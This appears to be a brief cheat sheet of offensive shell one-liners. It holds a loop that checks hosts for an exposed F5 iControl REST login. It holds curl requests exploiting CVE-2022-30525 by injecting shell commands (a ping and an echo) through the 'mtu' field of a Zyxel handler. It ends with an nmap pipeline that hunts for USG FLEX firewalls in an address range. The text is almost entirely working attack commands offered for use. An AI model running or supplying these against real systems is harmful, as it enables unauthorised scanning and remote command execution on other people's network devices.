# oneliner</br>
F5
</br>
cat hosts | while read host do; do curl -sk "https://$host/mgmt/shared/authn/login" | grep -q 'resterrorresponse' && printf "$host \0331;41mF5 iControl REST API Exposed\e[0m\n"; done
</br>

CVE-2022-30525
</br>
curl -v --insecure -X POST -H "Content-Type: application/json" -d
'{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"
:"1","vlanid":"5","mtu":"; ping 192.168.1.220;","data":"hi"}'
https://192.168.1.1/ztp/cgi-bin/handler
</br></br>
curl -v --insecure -X POST -H "Content-Type: application/json" -d
'{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged"
:"1","vlanid":"5","mtu":"; echo myppsmoll;","data":"hi"}'
https://192.168.1.1/ztp/cgi-bin/handler</br>



to SCAN SPECIFIC RANGE</br>
nmap x.x.x/x -p 443 -Pn -n -sS --min-rate 5000 --open|grep -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"|xargs -n1 -IPOP sh -c '{ echo POP; curl -ks https://POP|grep "<title>USG FLEX [1-7]00</title>" ; }'</br>
